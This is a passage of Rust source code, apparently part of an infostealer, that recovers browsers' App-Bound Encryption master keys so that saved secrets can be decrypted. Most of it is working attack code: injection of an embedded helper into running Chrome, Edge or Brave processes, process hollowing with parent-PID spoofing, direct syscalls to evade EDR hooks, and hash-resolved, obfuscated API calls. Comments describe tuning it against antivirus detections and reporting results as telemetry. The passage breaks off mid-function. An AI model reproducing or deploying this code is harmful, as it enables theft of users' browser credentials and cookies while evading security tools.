//! App-Bound Encryption (v20) master key recovery via the browser's own
//! elevation service.
//!
//! Chrome 127+/Edge/Brave validate that the IElevator caller's process image
//! lives in the browser's install dir. Two delivery strategies for the
//! embedded no-std helper (abe-helper.exe, see ../native-abe-helper):
//!
//! 1. Preferred — inject into an already-running browser process: manual-map
//!    the helper image (plain LoadLibrary is blocked by the browser's
//!    ProcessSignaturePolicy) and start it at its `run_thread` export via
//!    NtCreateThreadEx/CreateRemoteThread. The helper's arguments ride as
//!    the remote thread's parameter (a staged wide command line in the
//!    target's address space) — GetCommandLineW is cached at process init,
//!    so the PEB command line cannot be repointed in a live process.
//!    No new process, no suspended creation, no hollowing — the
//!    field-verified AV/EDR kills all targeted the hollowing path.
//! 2. Spawn-and-inject — when no browser process is running: spawn the real
//!    browser NORMALLY (no suspension, no parent spoof, no image rewrite;
//!    headless flags first, minimized window as the fallback variant), inject
//!    as in (1) once it is up, then kill the spawned tree via a
//!    kill-on-close job object. The tree we spawned is the only thing killed.
//! 3. Last resort — spawn the real browser binary suspended (best-effort
//!    parent-PID spoofed to explorer.exe via STARTUPINFOEXW), hollow it, and
//!    run the helper inside that process context (mainCRTStartup entry).
//!
//! The helper reads `Local State`, calls IElevator::DecryptData over COM, and
//! writes a fixed `KEYOK:<64 hex>` line to a named pipe we serve — with a
//! spoofed parent the child inherits handles from that parent, not from us,
//! so the pipe cannot be an inherited anonymous one. Nothing is ever written
//! to disk by us.
//!
//! All Win32 calls go through crate::resolve hash resolution; the remote
//! (cross-process) hollowing operations additionally prefer direct NT
//! syscalls (crate::syscall, Halo's Gate SSNs) with a silent per-call
//! fallback to the hash-resolved Win32/ntdll path when an SSN is
//! unavailable. The module adds no extern blocks and no new imports.
//! No panics: every fallible step returns None and all handles are closed
//! on the way out.
//!
//! INTEGRATION (integrator): add `mod abe;` to lib.rs, then in chromium.rs
//! where v20 blobs are detected, obtain the key with
//!     crate::abe::decrypt_app_bound_key(&user_data, &name)
//! and AES-256-GCM-decrypt v20 blobs with it (nonce = blob[3..15]).

use std::ffi::c_void;
use std::path::{Path, PathBuf};

use crate::resolve::{fnv1a, resolve, wide};
use crate::syscall::{self, NtAbe};

/// Embedded helper image. Produced by ../build.bat (builds
/// ../native-abe-helper and copies abe-helper.exe next to Cargo.toml).
static HELPER_PE: &[u8] = include_bytes!("../abe-helper.exe");

const CREATE_SUSPENDED: u32 = 0x4;
const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x0008_0000;
const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x0002_0000;
const PROCESS_CREATE_PROCESS: u32 = 0x0080;
const TH32CS_SNAPPROCESS: u32 = 0x2;
const STARTF_USESHOWWINDOW: u32 = 0x1;
const MEM_COMMIT_RESERVE: u32 = 0x3000;
const MEM_RELEASE: u32 = 0x8000;
const PAGE_READWRITE: u32 = 0x4;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PIPE_ACCESS_INBOUND: u32 = 0x1;
const PIPE_TYPE_BYTE: u32 = 0x0;
const PIPE_READMODE_BYTE: u32 = 0x0;
const PIPE_WAIT: u32 = 0x0;
const PIPE_REJECT_REMOTE_CLIENTS: u32 = 0x8;
const WAIT_TIMEOUT_MS: u32 = 15_000;
const CONTEXT_FULL_X64: u32 = 0x0010_000B; // CONTEXT_AMD64|CONTROL|INTEGER|FLOATING_POINT
const PEB_IMAGE_BASE_OFFSET: usize = 0x10;
const MAX_IMAGE_SIZE: usize = 64 * 1024 * 1024;
const MAX_PIPE_READ: usize = 4096;
// Injection into an existing browser process.
const PROCESS_INJECT_ACCESS: u32 = 0x0002 | 0x0008 | 0x0010 | 0x0020 | 0x0400; // CREATE_THREAD|VM_OPERATION|VM_READ|VM_WRITE|QUERY_INFORMATION
const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
const MAX_INJECT_TARGETS: usize = 8;

type Handle = *mut c_void;

// ---------------------------------------------------------------------------
// Win32 structures
// ---------------------------------------------------------------------------

#[repr(C)]
#[derive(Clone, Copy)]
struct StartupInfoW {
    cb: u32,
    lp_reserved: *mut u16,
    lp_desktop: *mut u16,
    lp_title: *mut u16,
    dw_x: u32,
    dw_y: u32,
    dw_x_size: u32,
    dw_y_size: u32,
    dw_x_count_chars: u32,
    dw_y_count_chars: u32,
    dw_fill_attribute: u32,
    dw_flags: u32,
    w_show_window: u16,
    cb_reserved2: u16,
    lp_reserved2: *mut u8,
    h_std_input: Handle,
    h_std_output: Handle,
    h_std_error: Handle,
}

#[repr(C)]
struct StartupInfoExW {
    startup_info: StartupInfoW,
    lp_attribute_list: *mut c_void,
}

const _: () = assert!(
    std::mem::size_of::<StartupInfoExW>() == std::mem::size_of::<StartupInfoW>() + 8
);

/// Toolhelp process entry (same layout as procs.rs; that module's helpers
/// are private, so we keep a minimal local copy).
#[repr(C)]
struct ProcessEntry32W {
    dw_size: u32,
    cnt_usage: u32,
    th32_process_id: u32,
    th32_default_heap_id: usize,
    th32_module_id: u32,
    cnt_threads: u32,
    th32_parent_process_id: u32,
    pc_pri_class_base: i32,
    dw_flags: u32,
    sz_exe_file: [u16; 260],
}

#[repr(C)]
struct ProcessInformation {
    h_process: Handle,
    h_thread: Handle,
    dw_process_id: u32,
    dw_thread_id: u32,
}

#[repr(C)]
struct ProcessBasicInformation {
    exit_status: i32,
    _pad: i32,
    peb_base_address: *mut c_void,
    affinity_mask: usize,
    base_priority: i32,
    _pad2: i32,
    unique_process_id: usize,
    inherited_from_unique_process_id: usize,
}

/// x64 CONTEXT; we only touch flags and rcx, the rest is passed through.
#[repr(C, align(16))]
struct Context {
    p1_home: u64,
    p2_home: u64,
    p3_home: u64,
    p4_home: u64,
    p5_home: u64,
    p6_home: u64,
    context_flags: u32,
    mx_csr: u32,
    seg_cs: u16,
    seg_ds: u16,
    seg_es: u16,
    seg_fs: u16,
    seg_gs: u16,
    seg_ss: u16,
    eflags: u32,
    dr0: u64,
    dr1: u64,
    dr2: u64,
    dr3: u64,
    dr6: u64,
    dr7: u64,
    rax: u64,
    rcx: u64,
    rdx: u64,
    rbx: u64,
    rsp: u64,
    rbp: u64,
    rsi: u64,
    rdi: u64,
    r8: u64,
    r9: u64,
    r10: u64,
    r11: u64,
    r12: u64,
    r13: u64,
    r14: u64,
    r15: u64,
    rip: u64,
    _rest: [u8; 1232 - 0x100],
}

const _: () = assert!(std::mem::size_of::<Context>() == 1232);
const _: () = assert!(std::mem::size_of::<ProcessBasicInformation>() == 48);

// ---------------------------------------------------------------------------
// Resolved function pointer types
// ---------------------------------------------------------------------------

type CreateNamedPipeWFn = unsafe extern "system" fn(
    *const u16,
    u32,
    u32,
    u32,
    u32,
    u32,
    u32,
    *mut c_void,
) -> Handle;
type PeekNamedPipeFn =
    unsafe extern "system" fn(Handle, *mut c_void, u32, *mut u32, *mut u32, *mut u32) -> i32;
type CreateProcessWFn = unsafe extern "system" fn(
    *const u16,
    *mut u16,
    *mut c_void,
    *mut c_void,
    i32,
    u32,
    *mut c_void,
    *const u16,
    *mut StartupInfoW,
    *mut ProcessInformation,
) -> i32;
type ReadFileFn = unsafe extern "system" fn(Handle, *mut u8, u32, *mut u32, *mut c_void) -> i32;
type WaitForSingleObjectFn = unsafe extern "system" fn(Handle, u32) -> u32;
type TerminateProcessFn = unsafe extern "system" fn(Handle, u32) -> i32;
type GetThreadContextFn = unsafe extern "system" fn(Handle, *mut Context) -> i32;
type SetThreadContextFn = unsafe extern "system" fn(Handle, *const Context) -> i32;
type ResumeThreadFn = unsafe extern "system" fn(Handle) -> u32;
type VirtualAllocExFn = unsafe extern "system" fn(Handle, Handle, usize, u32, u32) -> Handle;
type VirtualFreeExFn = unsafe extern "system" fn(Handle, Handle, usize, u32) -> i32;
type VirtualProtectExFn = unsafe extern "system" fn(Handle, Handle, usize, u32, *mut u32) -> i32;
type CreateRemoteThreadFn = unsafe extern "system" fn(
    Handle,
    *mut c_void,
    usize,
    *mut c_void,
    *mut c_void,
    u32,
    *mut u32,
) -> Handle;
type WriteProcessMemoryFn =
    unsafe extern "system" fn(Handle, Handle, *const c_void, usize, *mut usize) -> i32;
type ReadProcessMemoryFn =
    unsafe extern "system" fn(Handle, *const c_void, *mut c_void, usize, *mut usize) -> i32;
type NtQueryInformationProcessFn =
    unsafe extern "system" fn(Handle, u32, *mut c_void, u32, *mut u32) -> i32;
type NtUnmapViewOfSectionFn = unsafe extern "system" fn(Handle, Handle) -> i32;
type InitializeProcThreadAttributeListFn =
    unsafe extern "system" fn(*mut c_void, u32, u32, *mut usize) -> i32;
type UpdateProcThreadAttributeFn = unsafe extern "system" fn(
    *mut c_void,
    u32,
    usize,
    *const c_void,
    usize,
    *mut c_void,
    *mut usize,
) -> i32;
type DeleteProcThreadAttributeListFn = unsafe extern "system" fn(*mut c_void);
type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> Handle;
type CreateToolhelp32SnapshotFn = unsafe extern "system" fn(u32, u32) -> Handle;
type Process32FirstWFn = unsafe extern "system" fn(Handle, *mut ProcessEntry32W) -> i32;
type Process32NextWFn = unsafe extern "system" fn(Handle, *mut ProcessEntry32W) -> i32;
type DisconnectNamedPipeFn = unsafe extern "system" fn(Handle) -> i32;
type CreateFileMappingWFn = unsafe extern "system" fn(
    Handle,
    *const c_void,
    u32,
    u32,
    u32,
    *const u16,
) -> Handle;
type MapViewOfFileFn =
    unsafe extern "system" fn(Handle, u32, u32, u32, usize) -> *mut c_void;

// ---------------------------------------------------------------------------
// Result channels: named pipe + shared-memory section, both world-accessible
// (null DACL). The field showed the helper obtaining the key but failing to
// deliver it (exit 9): a pipe created with the default DACL by a SYSTEM
// agent is not writable from a user-context browser process, and a pipe
// with a single instance never DisconnectNamedPipe'd refuses every client
// after the first. The shared-memory section is the pipe-independent backup.
// ---------------------------------------------------------------------------

#[repr(C)]
struct SecurityAttributes {
    length: u32,
    sd: *mut c_void,
    inherit: i32,
}

/// SECURITY_ATTRIBUTES with a null DACL (everyone full access) over a
/// caller-owned 64-byte descriptor buffer. None if advapi32 won't resolve;
/// callers then fall back to default security.
unsafe fn build_world_sd(buf: &mut [u8; 64]) -> Option<SecurityAttributes> {
    type InitFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
    type SetDaclFn = unsafe extern "system" fn(*mut c_void, i32, *mut c_void, i32) -> i32;
    let adv = crate::obf!("advapi32.dll");
    let a_init = resolve(&adv, crate::api!("InitializeSecurityDescriptor"));
    let a_set = resolve(&adv, crate::api!("SetSecurityDescriptorDacl"));
    if a_init == 0 || a_set == 0 {
        return None;
    }
    let init: InitFn = std::mem::transmute(a_init);
    let set_dacl: SetDaclFn = std::mem::transmute(a_set);
    if init(buf.as_mut_ptr() as *mut c_void, 1) == 0 {
        return None;
    }
    // DACL present but null = no access checks at all.
    if set_dacl(buf.as_mut_ptr() as *mut c_void, 1, std::ptr::null_mut(), 0) == 0 {
        return None;
    }
    Some(SecurityAttributes {
        length: std::mem::size_of::<SecurityAttributes>() as u32,
        sd: buf.as_mut_ptr() as *mut c_void,
        inherit: 0,
    })
}

const FILE_MAP_ALL_ACCESS: u32 = 0x000F_001F;
const SHM_SIZE: usize = 4096;
const INVALID_HANDLE_VALUE: Handle = -1isize as Handle;

/// Shared-memory result channel. The parent creates the section and maps it
/// locally; the helper opens it by name from inside the browser process.
struct ShmChannel {
    name: String,
    map: Handle,
    view: *mut u8,
}

impl Drop for ShmChannel {
    fn drop(&mut self) {
        unsafe {
            if !self.view.is_null() {
                let fp = resolve("kernel32.dll", crate::api!("UnmapViewOfFile"));
                if fp != 0 {
                    let f: unsafe extern "system" fn(*mut c_void) -> i32 = std::mem::transmute(fp);
                    f(self.view as *mut c_void);
                }
            }
            dyn_close_handle(self.map);
        }
    }
}

impl ShmChannel {
    fn clear(&self) {
        unsafe { std::ptr::write_bytes(self.view, 0, SHM_SIZE) }
    }

    /// Parse whatever the helper wrote (KEYOK / FAIL line), same grammar as
    /// the pipe payload.
    fn read_diag(&self) -> (Option<Vec<u8>>, Option<String>) {
        unsafe {
            let mut n = 0;
            while n < 256 && *self.view.add(n) != 0 {
                n += 1;
            }
            if n == 0 {
                return (None, None);
            }
            parse_pipe_diag(std::slice::from_raw_parts(self.view, n))
        }
    }
}

unsafe fn create_shm_channel(sa: *const c_void) -> Option<ShmChannel> {
    let create: CreateFileMappingWFn = tf(resolve("kernel32.dll", crate::api!("CreateFileMappingW")))?;
    let map_view: MapViewOfFileFn = tf(resolve("kernel32.dll", crate::api!("MapViewOfFile")))?;
    // Global\ prefix makes the section visible across sessions (SYSTEM agent
    // in session 0 vs user-session browser); plain name as fallback.
    let base = format!("{}{}", crate::obf!("xf-"), random_pipe_suffix());
    for prefix in [crate::obf!("Global\\"), String::new()] {
        let name = format!("{}{}", prefix, base);
        let name_w = wide(&name);
        let h = create(
            INVALID_HANDLE_VALUE,
            sa,
            PAGE_READWRITE,
            0,
            SHM_SIZE as u32,
            name_w.as_ptr(),
        );
        if h.is_null() {
            continue;
        }
        let view = map_view(h, FILE_MAP_ALL_ACCESS, 0, 0, SHM_SIZE) as *mut u8;
        if view.is_null() {
            dyn_close_handle(h);
            continue;
        }
        std::ptr::write_bytes(view, 0, SHM_SIZE);
        return Some(ShmChannel { name, map: h, view });
    }
    None
}

/// Read the helper's result from the pipe, then the shared-memory fallback;
/// pipe wins when both carry data. Disconnects the pipe so the NEXT helper
/// attempt (single-instance pipe) can connect at all.
unsafe fn collect_result(
    pipe: Handle,
    peek_named_pipe: PeekNamedPipeFn,
    read_file: ReadFileFn,
    shm: &Option<ShmChannel>,
) -> (Option<Vec<u8>>, Option<String>) {
    let out = drain_pipe(pipe, peek_named_pipe, read_file);
    disconnect_pipe(pipe);
    let (mut key, mut fail) = parse_pipe_diag(&out);
    if let Some(s) = shm {
        let (k2, f2) = s.read_diag();
        if key.is_none() {
            key = k2;
        }
        if fail.is_none() {
            fail = f2;
        }
    }
    (key, fail)
}

fn disconnect_pipe(pipe: Handle) {
    unsafe {
        let fp = resolve("kernel32.dll", crate::api!("DisconnectNamedPipe"));
        if fp != 0 {
            let f: DisconnectNamedPipeFn = std::mem::transmute(fp);
            f(pipe);
        }
    }
}

// ---------------------------------------------------------------------------
// Remote operation dispatch: direct NT syscall first (bypasses user-mode
// hooks), hash-resolved Win32/ntdll call as the per-call fallback.
// ---------------------------------------------------------------------------

struct RemoteOps {
    nt: NtAbe,
    virtual_alloc_ex: VirtualAllocExFn,
    virtual_free_ex: Option<VirtualFreeExFn>,
    virtual_protect_ex: Option<VirtualProtectExFn>,
    create_remote_thread: Option<CreateRemoteThreadFn>,
    write_process_memory: WriteProcessMemoryFn,
    read_process_memory: ReadProcessMemoryFn,
    get_thread_context: GetThreadContextFn,
    set_thread_context: SetThreadContextFn,
    resume_thread: ResumeThreadFn,
    wait_for_single_object: WaitForSingleObjectFn,
    terminate_process: TerminateProcessFn,
    nt_query_information_process: NtQueryInformationProcessFn,
    nt_unmap_view_of_section: NtUnmapViewOfSectionFn,
}

impl RemoteOps {
    /// VirtualAllocEx equivalent. Returns the allocated base or null.
    unsafe fn alloc_ex(&self, h: Handle, want_base: u64, size: usize, protect: u32) -> Handle {
        if self.nt.allocate_virtual_memory != 0 {
            let mut base = want_base as usize;
            let mut region = size;
            let status = self.nt.allocate_virtual_memory(
                h as usize,
                &mut base,
                0,
                &mut region,
                MEM_COMMIT_RESERVE,
                protect,
            );
            return if status >= 0 {
                base as Handle
            } else {
                std::ptr::null_mut()
            };
        }
        (self.virtual_alloc_ex)(
            h,
            want_base as usize as Handle,
            size,
            MEM_COMMIT_RESERVE,
            protect,
        )
    }

    unsafe fn write(&self, h: Handle, base: usize, data: &[u8]) -> bool {
        let mut written: usize = 0;
        if self.nt.write_virtual_memory != 0 {
            return self.nt.write_virtual_memory(
                h as usize,
                base,
                data.as_ptr() as *const c_void,
                data.len(),
                &mut written,
            ) >= 0 && written == data.len();
        }
        (self.write_process_memory)(
            h,
            base as Handle,
            data.as_ptr() as *const c_void,
            data.len(),
            &mut written,
        ) != 0
            && written == data.len()
    }

    unsafe fn read_u64(&self, h: Handle, addr: usize) -> Option<u64> {
        let mut buf = [0u8; 8];
        if self.read_bytes(h, addr, &mut buf) {
            Some(u64::from_le_bytes(buf))
        } else {
            None
        }
    }

    /// ReadProcessMemory equivalent over an arbitrary buffer.
    unsafe fn read_bytes(&self, h: Handle, addr: usize, buf: &mut [u8]) -> bool {
        let mut n: usize = 0;
        if self.nt.read_virtual_memory != 0 {
            return self.nt.read_virtual_memory(
                h as usize,
                addr,
                buf.as_mut_ptr() as *mut c_void,
                buf.len(),
                &mut n,
            ) >= 0
                && n == buf.len();
        }
        (self.read_process_memory)(
            h,
            addr as *const c_void,
            buf.as_mut_ptr() as *mut c_void,
            buf.len(),
            &mut n,
        ) != 0
            && n == buf.len()
    }

    /// VirtualFreeEx(MEM_RELEASE) equivalent; best-effort on both paths.
    unsafe fn free_ex(&self, h: Handle, base: usize) {
        if base == 0 {
            return;
        }
        if self.nt.free_virtual_memory != 0 {
            let mut b = base;
            let mut s: usize = 0;
            self.nt
                .free_virtual_memory(h as usize, &mut b, &mut s, MEM_RELEASE);
            return;
        }
        if let Some(vf) = self.virtual_free_ex {
            vf(h, base as Handle, 0, MEM_RELEASE);
        }
    }

    /// Start a remote thread at `start`: NtCreateThreadEx when the SSN
    /// resolved, CreateRemoteThread otherwise. Null on failure.
    unsafe fn create_thread(&self, h: Handle, start: usize, arg: usize) -> Handle {
        if self.nt.create_thread_ex != 0 {
            let mut th: usize = 0;
            if self.nt.create_thread_ex(
                &mut th,
                THREAD_ALL_ACCESS,
                0,
                h as usize,
                start,
                arg,
                0,
                0,
                0,
                0,
                0,
            ) >= 0
                && th != 0
            {
                return th as Handle;
            }
        }
        if let Some(crt) = self.create_remote_thread {
            return crt(
                h,
                std::ptr::null_mut(),
                0,
                start as *mut c_void,
                arg as *mut c_void,
                0,
                std::ptr::null_mut(),
            );
        }
        std::ptr::null_mut()
    }

    /// VirtualProtectEx equivalent; false if neither path is available or
    /// the call failed (caller decides whether to fall back to RWX).
    unsafe fn protect_ex(&self, h: Handle, base: usize, size: usize, new: u32) -> bool {
        if self.nt.protect_virtual_memory != 0 {
            let mut b = base;
            let mut s = size;
            let mut old: u32 = 0;
            return self
                .nt
                .protect_virtual_memory(h as usize, &mut b, &mut s, new, &mut old)
                >= 0;
        }
        if let Some(vp) = self.virtual_protect_ex {
            let mut old: u32 = 0;
            return vp(h, base as Handle, size, new, &mut old) != 0;
        }
        false
    }

    unsafe fn get_ctx(&self, h: Handle, ctx: *mut Context) -> bool {
        if self.nt.get_context_thread != 0 {
            return self.nt.get_context_thread(h as usize, ctx as *mut c_void) >= 0;
        }
        (self.get_thread_context)(h, ctx) != 0
    }

    unsafe fn set_ctx(&self, h: Handle, ctx: *const Context) -> bool {
        if self.nt.set_context_thread != 0 {
            return self.nt.set_context_thread(h as usize, ctx as *const c_void) >= 0;
        }
        (self.set_thread_context)(h, ctx) != 0
    }

    unsafe fn resume(&self, h: Handle) -> bool {
        if self.nt.resume_thread != 0 {
            let mut previous: u32 = 0;
            return self.nt.resume_thread(h as usize, &mut previous) >= 0;
        }
        (self.resume_thread)(h) != u32::MAX
    }

    unsafe fn wait(&self, h: Handle, ms: u32) {
        if self.nt.wait_for_single_object != 0 {
            let timeout: i64 = -(ms as i64) * 10_000; // relative, 100ns units
            self.nt.wait_for_single_object(h as usize, 0, &timeout);
            return;
        }
        (self.wait_for_single_object)(h, ms);
    }

    unsafe fn terminate(&self, h: Handle) {
        if self.nt.terminate_process != 0 {
            self.nt.terminate_process(h as usize, 0);
            return;
        }
        (self.terminate_process)(h, 0);
    }

    unsafe fn query_basic_info(&self, h: Handle, pbi: *mut ProcessBasicInformation) -> bool {
        if self.nt.query_information_process != 0 {
            return self.nt.query_information_process(
                h as usize,
                0, // ProcessBasicInformation
                pbi as *mut c_void,
                std::mem::size_of::<ProcessBasicInformation>() as u32,
                std::ptr::null_mut(),
            ) >= 0;
        }
        (self.nt_query_information_process)(
            h,
            0,
            pbi as *mut c_void,
            std::mem::size_of::<ProcessBasicInformation>() as u32,
            std::ptr::null_mut(),
        ) == 0
    }

    unsafe fn unmap(&self, h: Handle, base: usize) {
        if self.nt.unmap_view_of_section != 0 {
            self.nt.unmap_view_of_section(h as usize, base);
            return;
        }
        (self.nt_unmap_view_of_section)(h, base as Handle);
    }
}

/// Transmute a resolved address into a typed fn pointer; None if unresolved.
unsafe fn tf<T>(addr: usize) -> Option<T> {
    if addr == 0 {
        None
    } else {
        Some(std::mem::transmute_copy(&addr))
    }
}

unsafe fn dyn_close_handle(h: Handle) {
    let fp = resolve("kernel32.dll", crate::api!("CloseHandle"));
    if fp != 0 && !h.is_null() {
        let f: unsafe extern "system" fn(Handle) -> i32 = std::mem::transmute(fp);
        f(h);
    }
}

unsafe fn dyn_delete_attr_list(p: *mut c_void) {
    // Resolved from kernelbase: kernel32 forwards the attribute-list APIs to
    // api-ms-win-core-processthreads-l1-1-0, which forwards right back to
    // kernel32 — a cycle resolve()'s depth cap cannot catch (it restarts at
    // depth 0 on every hop).
    let fp = resolve(&crate::obf!("kernelbase.dll"), crate::api!("DeleteProcThreadAttributeList"));
    if fp != 0 && !p.is_null() {
        let f: DeleteProcThreadAttributeListFn = std::mem::transmute(fp);
        f(p);
    }
}

struct HandleGuard(Handle);

impl Drop for HandleGuard {
    fn drop(&mut self) {
        unsafe { dyn_close_handle(self.0) }
    }
}

// ---------------------------------------------------------------------------
// Parent-PID spoofing (best-effort)
// ---------------------------------------------------------------------------

/// Extended startup info parenting the new browser process to explorer.exe,
/// so the hollowed process does not appear as a child of our host.
struct ParentSpoof {
    si_ex: StartupInfoExW,
    // Backing storage for si_ex.lp_attribute_list; never resized after the
    // pointer is taken, so the attribute list stays valid.
    _attr_storage: Vec<u8>,
    parent: Handle,
}

impl Drop for ParentSpoof {
    fn drop(&mut self) {
        unsafe {
            dyn_delete_attr_list(self.si_ex.lp_attribute_list);
            dyn_close_handle(self.parent);
        }
    }
}

/// Find a process PID by exact exe name (case-insensitive) via Toolhelp32.
unsafe fn find_process_id(exe_name: &str) -> Option<u32> {
    find_process_ids(exe_name).into_iter().next()
}

/// All PIDs matching an exe name (case-insensitive), capped to bound the
/// injection attempt loop.
unsafe fn find_process_ids(exe_name: &str) -> Vec<u32> {
    let k32 = "kernel32.dll";
    let mut out = Vec::new();
    let snapshot: CreateToolhelp32SnapshotFn =
        match tf(resolve(k32, crate::api!("CreateToolhelp32Snapshot"))) {
            Some(f) => f,
            None => return out,
        };
    let first: Process32FirstWFn = match tf(resolve(k32, crate::api!("Process32FirstW"))) {
        Some(f) => f,
        None => return out,
    };
    let next: Process32NextWFn = match tf(resolve(k32, crate::api!("Process32NextW"))) {
        Some(f) => f,
        None => return out,
    };

    let snap = snapshot(TH32CS_SNAPPROCESS, 0);
    if snap.is_null() || snap as isize == -1 {
        return out;
    }
    let mut entry: ProcessEntry32W = std::mem::zeroed();
    entry.dw_size = std::mem::size_of::<ProcessEntry32W>() as u32;
    if first(snap, &mut entry) != 0 {
        loop {
            let len = entry
                .sz_exe_file
                .iter()
                .position(|&c| c == 0)
                .unwrap_or(entry.sz_exe_file.len());
            let name = String::from_utf16_lossy(&entry.sz_exe_file[..len]);
            if name.eq_ignore_ascii_case(exe_name) {
                out.push(entry.th32_process_id);
                if out.len() >= MAX_INJECT_TARGETS {
                    break;
                }
            }
            if next(snap, &mut entry) == 0 {
                break;
            }
        }
    }
    dyn_close_handle(snap);
    out
}

/// Build a STARTUPINFOEXW with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS pointing
/// at explorer.exe. Best-effort: None if any step fails, and the caller falls
/// back to a plain STARTUPINFOW creation.
///
/// Note: with a spoofed parent the child inherits handles from the spoofed
/// parent, not from us — which is why the helper's output channel is a named
/// pipe it connects to itself, not an inherited anonymous pipe.
unsafe fn prepare_parent_spoof(si: &StartupInfoW) -> Option<ParentSpoof> {
    let k32 = "kernel32.dll";
    // kernelbase, not kernel32: kernel32 forwards these to an API-set stub
    // that forwards back to kernel32, which loops resolve() forever.
    let kbase = crate::obf!("kernelbase.dll");
    let init: InitializeProcThreadAttributeListFn =
        tf(resolve(&kbase, crate::api!("InitializeProcThreadAttributeList")))?;
    let update: UpdateProcThreadAttributeFn =
        tf(resolve(&kbase, crate::api!("UpdateProcThreadAttribute")))?;
    let open_process: OpenProcessFn = tf(resolve(k32, crate::api!("OpenProcess")))?;

    let pid = find_process_id(&crate::obf!("explorer.exe"))?;
    let parent = open_process(PROCESS_CREATE_PROCESS, 0, pid);
    if parent.is_null() {
        return None;
    }

    let mut size: usize = 0;
    // First call is a size query and is expected to fail with size set.
    init(std::ptr::null_mut(), 1, 0, &mut size);
    if size == 0 {
        dyn_close_handle(parent);
        return None;
    }
    let mut storage = vec![0u8; size];
    let list = storage.as_mut_ptr() as *mut c_void;
    if init(list, 1, 0, &mut size) == 0 {
        dyn_close_handle(parent);
        return None;
    }
    if update(
        list,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &parent as *const Handle as *const c_void,
        std::mem::size_of::<Handle>(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
    ) == 0
    {
        dyn_delete_attr_list(list);
        dyn_close_handle(parent);
        return None;
    }

    let mut si_ex = StartupInfoExW {
        startup_info: *si,
        lp_attribute_list: list,
    };
    // With EXTENDED_STARTUPINFO_PRESENT, cb covers the whole STARTUPINFOEXW.
    si_ex.startup_info.cb = std::mem::size_of::<StartupInfoExW>() as u32;
    Some(ParentSpoof {
        si_ex,
        _attr_storage: storage,
        parent,
    })
}

// ---------------------------------------------------------------------------
// Public entry point
// ---------------------------------------------------------------------------

/// Diagnostics for one ABE recovery attempt, for xfill_progress / Info.json
/// telemetry. `path` is "inj" (injected into a running browser) or "hol"
/// (hollowed child) on success; `fail` is a compact reason chain like
/// "inj:open=5|hol:create=2" or "helper=3/80004005" on failure.
#[derive(Default)]
pub struct AbeReport {
    /// Browser exe file version ("142.0.0.0"), when resolvable.
    pub version: Option<String>,
    pub path: &'static str,
    pub fail: Option<String>,
    /// Why injection into a running browser didn't produce the key, when it
    /// was attempted but the hollow fallback had to be used (or also failed).
    pub inj_note: Option<String>,
}

/// Recover the 32-byte app-bound (v20) master key for the given browser,
/// with per-stage failure diagnostics. `browser_root` is the browser's
/// "User Data" directory, `browser_name` a display name ("Chrome", "Edge",
/// "Brave-Browser", ...). (None, report) on any failure.
pub fn decrypt_app_bound_key_diag(browser_root: &Path, browser_name: &str) -> (Option<Vec<u8>>, AbeReport) {
    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| unsafe {
        decrypt_inner(browser_root, browser_name)
    }))
    .unwrap_or_else(|_| {
        (
            None,
            AbeReport {
                fail: Some("panic".to_string()),
                ..Default::default()
            },
        )
    })
}

/// File version of the browser's exe (telemetry: IElevator IID revs track
/// browser versions). None for forks we don't know.
pub fn browser_version(browser_name: &str) -> Option<String> {
    let canonical = canonical_browser_name(browser_name)?;
    let exe = find_browser_exe(canonical)?;
    file_version(&exe)
}

unsafe fn decrypt_inner(browser_root: &Path, browser_name: &str) -> (Option<Vec<u8>>, AbeReport) {
    let mut rep = AbeReport::default();
    let fail = |rep: &mut AbeReport, r: &str| -> (Option<Vec<u8>>, AbeReport) {
        rep.fail = Some(r.to_string());
        (None, std::mem::take(rep))
    };
    let Some(canonical) = canonical_browser_name(browser_name) else {
        return fail(&mut rep, "iid_unknown");
    };
    let Some(exe) = find_browser_exe(canonical) else {
        return fail(&mut rep, "no_exe");
    };
    rep.version = file_version(&exe);
    let local_state = browser_root.join(crate::obf!("Local State"));
    if !local_state.is_file() {
        return fail(&mut rep, "no_local_state");
    }

    let k32 = "kernel32.dll";
    let ntdll = crate::obf!("ntdll.dll");
    let (Some(create_process_w), Some(read_file), Some(create_named_pipe_w), Some(peek_named_pipe)): (
        Option<CreateProcessWFn>,
        Option<ReadFileFn>,
        Option<CreateNamedPipeWFn>,
        Option<PeekNamedPipeFn>,
    ) = (
        tf(resolve(k32, crate::api!("CreateProcessW"))),
        tf(resolve(k32, crate::api!("ReadFile"))),
        tf(resolve(k32, crate::api!("CreateNamedPipeW"))),
        tf(resolve(k32, crate::api!("PeekNamedPipe"))),
    ) else {
        return fail(&mut rep, "resolve");
    };

    // Remote ops: direct syscalls where SSNs resolved, Win32/ntdll otherwise.
    let ops = RemoteOps {
        nt: syscall::nt_abe(),
        virtual_alloc_ex: match tf(resolve(k32, crate::api!("VirtualAllocEx"))) {
            Some(f) => f,
            None => return fail(&mut rep, "resolve"),
        },
        virtual_free_ex: tf(resolve(k32, crate::api!("VirtualFreeEx"))),
        virtual_protect_ex: tf(resolve(k32, crate::api!("VirtualProtectEx"))),
        create_remote_thread: tf(resolve(k32, crate::api!("CreateRemoteThread"))),
        write_process_memory: match tf(resolve(k32, crate::api!("WriteProcessMemory"))) {
            Some(f) => f,
            None => return fail(&mut rep, "resolve"),
        },
        read_process_memory: match tf(resolve(k32, crate::api!("ReadProcessMemory"))) {
            Some(f) => f,
            None => return fail(&mut rep, "resolve"),
        },
        get_thread_context: match tf(resolve(k32, crate::api!("GetThreadContext"))) {
            Some(f) => f,
            None => return fail(&mut rep, "resolve"),
        },
        set_thread_context: match tf(resolve(k32, crate::api!("SetThreadContext"))) {
            Some(f) => f,
            None => return fail(&mut rep, "resolve"),
        },
        resume_thread: match tf(resolve(k32, crate::api!("ResumeThread"))) {
            Some(f) => f,
            None => return fail(&mut rep, "resolve"),
        },
